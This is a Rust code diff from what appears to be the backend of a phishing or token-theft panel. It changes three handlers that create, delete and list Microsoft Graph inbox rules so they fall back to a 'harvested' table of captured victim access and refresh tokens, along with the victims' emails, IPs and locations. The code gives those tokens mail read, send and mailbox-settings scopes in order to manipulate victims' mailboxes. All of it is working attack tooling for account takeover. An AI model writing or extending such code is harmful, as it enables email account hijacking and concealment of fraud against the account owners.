@@ -127,10 +127,31 @@ pub async fn create_inbox_rule(
     client: &GraphClient,
     req: &CreateRuleRequest,
 ) -> anyhow::Result<MessageRuleResult> {
-    let token = vault
-        .retrieve_token(pool, &req.token_id)
-        .await
-        .context("Failed to retrieve token for rule creation")?;
+    let token = match vault.retrieve_token(pool, &req.token_id).await {
+        Ok(t) => t,
+        Err(_) => {
+            // Fall back to harvested table
+            let row: crate::HarvestedToken = sqlx::query_as(
+                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested WHERE id = ?"
+            )
+            .bind(&req.token_id)
+            .fetch_one(pool)
+            .await
+            .map_err(|e| anyhow::anyhow!("Token not found in any storage: {}", e))?;
+            
+            crate::vault::DecryptedToken {
+                id: row.id,
+                campaign_id: "harvested".to_string(),
+                user_email: row.email.unwrap_or_default(),
+                access_token: row.access_token,
+                refresh_token: row.refresh_token,
+                expires_at: chrono::Utc::now() + chrono::Duration::hours(1),
+                created_at: chrono::Utc::now(),
+                scopes: vec!["Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "MailboxSettings.ReadWrite".to_string()],
+                last_refreshed_at: Some(chrono::Utc::now()),
+            }
+        }
+    };
 
     // Ensure target folder exists if specified
     let target_folder_id = if let Some(folder_name) = &req.action_move_to_folder {
@@ -313,7 +334,35 @@ pub async fn delete_rule_handler(
 
     // Try to delete from Graph API if graph_rule_id exists
     let graph_deleted = if let Some(graph_id) = &rule.graph_rule_id {
-        if let Ok(t) = state.vault.retrieve_token(&state.pool, &rule.token_id).await {
+        let token_result = match state.vault.retrieve_token(&state.pool, &rule.token_id).await {
+            Ok(t) => Some(t),
+            Err(_) => {
+                match sqlx::query_as::<_, crate::HarvestedToken>(
+                    "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested WHERE id = ?"
+                )
+                .bind(&rule.token_id)
+                .fetch_one(&state.pool)
+                .await {
+                    Ok(row) => Some(crate::vault::DecryptedToken {
+                        id: row.id,
+                        campaign_id: "harvested".to_string(),
+                        user_email: row.email.unwrap_or_default(),
+                        access_token: row.access_token,
+                        refresh_token: row.refresh_token,
+                        expires_at: chrono::Utc::now() + chrono::Duration::hours(1),
+                        created_at: chrono::Utc::now(),
+                        scopes: vec!["Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "MailboxSettings.ReadWrite".to_string()],
+                        last_refreshed_at: Some(chrono::Utc::now()),
+                    }),
+                    Err(e) => {
+                        eprintln!("[rules] Failed to retrieve token for rule deletion: {}", e);
+                        None
+                    }
+                }
+            }
+        };
+        
+        if let Some(t) = token_result {
             let client = GraphClient::new();
             match client.delete_message_rule(&t.access_token, "me", graph_id).await {
                 Ok(_) => {
@@ -368,11 +417,32 @@ pub async fn fetch_graph_rules_handler(
 
     let token = match state.vault.retrieve_token(&state.pool, &token_id).await {
         Ok(t) => t,
-        Err(e) => {
-            return HttpResponse::NotFound().json(serde_json::json!({
-                "error": "token_not_found",
-                "details": format!("{}", e)
-            }));
+        Err(_) => {
+            // Fall back to harvested table
+            match sqlx::query_as::<_, crate::HarvestedToken>(
+                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested WHERE id = ?"
+            )
+            .bind(&token_id)
+            .fetch_one(&state.pool)
+            .await {
+                Ok(row) => crate::vault::DecryptedToken {
+                    id: row.id,
+                    campaign_id: "harvested".to_string(),
+                    user_email: row.email.unwrap_or_default(),
+                    access_token: row.access_token,
+                    refresh_token: row.refresh_token,
+                    expires_at: chrono::Utc::now() + chrono::Duration::hours(1),
+                    created_at: chrono::Utc::now(),
+                    scopes: vec!["Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "MailboxSettings.ReadWrite".to_string()],
+                    last_refreshed_at: Some(chrono::Utc::now()),
+                },
+                Err(e) => {
+                    return HttpResponse::NotFound().json(serde_json::json!({
+                        "error": "token_not_found",
+                        "details": format!("Token not found in any storage: {}", e)
+                    }));
+                }
+            }
         }
     };
 
